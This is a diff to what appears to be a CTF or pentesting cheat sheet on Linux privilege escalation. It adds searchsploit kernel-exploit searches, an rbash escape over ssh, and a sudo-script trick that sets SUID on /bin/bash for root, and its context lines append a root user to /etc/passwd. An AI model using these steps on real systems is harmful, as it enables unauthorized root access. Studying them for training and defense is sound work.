@@ -1887,6 +1887,17 @@ find / -perm -u=s -type f 2>/dev/null
 strings file_read(Read file)
 which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp git 2>/dev/null
 ```
+## Searchsploit Exploit Finder
+- Finding right exploit
+```bash
+cat /etc/issue
+# Ubuntu 16.04.4 LTS \n \l
+uname -r 
+# 4.4.0-116-generic
+arch 
+# x86_64
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+```
 ## Wheel Linux FreeBSD
 - A group of users with similar permissions to the root user, but without using root user credentials.
 - Read the doas config file commands slightly different commapred to the regular Linux command
@@ -1968,6 +1979,33 @@ DLYJ9ZDE6uY5o
 >echo "ashok:DLYJ9ZDE6uY5o:0:0:root:/root:/bin/bash" >> /etc/passwd
 >su ashok(#password is also ashok, switch directory to ashok get the flag)
 ```
+
+## rbash
+-Some times linux shell is restricted if have ssh shell and credentials
+```bash
+ssh <user>@<ip> -t "bash --noprofile"
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+## Scripts to sudo -l
+_ If some scripts have have the sudo permission
+```bash
+#(ALL) NOPASSWD: /../../../../../../home/user/.cgi_bin/bin /tmp/*
+#creating bin file in the user
+nano bin
+#!/bin/bash
+chmod u+s /bin/bash
+---END of FILE
+#Run his command woth sudo
+sudo /../../../../../../home/user/.cgi_bin/bin /tmp/*
+ll /bin/bash 
+# if Stickiy bit is set
+/bin/bash -p
+id #if euid is set 0
+#then root
+whoami
+```
+
 ## Linux Shells and Apache Commons Text 1.8 (Text4shell), CVE-2022–42889
 - In nmap result has port 8080 http-proxy is open, using gobuster identifed /search, /CHANGELOG.
 - In /CHANGELOG shown "Added Apache Commons Text 1.8" leads to this link [Medium](https://medium.com/mii-cybersec/cve-2022-42889-text4shell-vulnerability-17b703a48dcd)
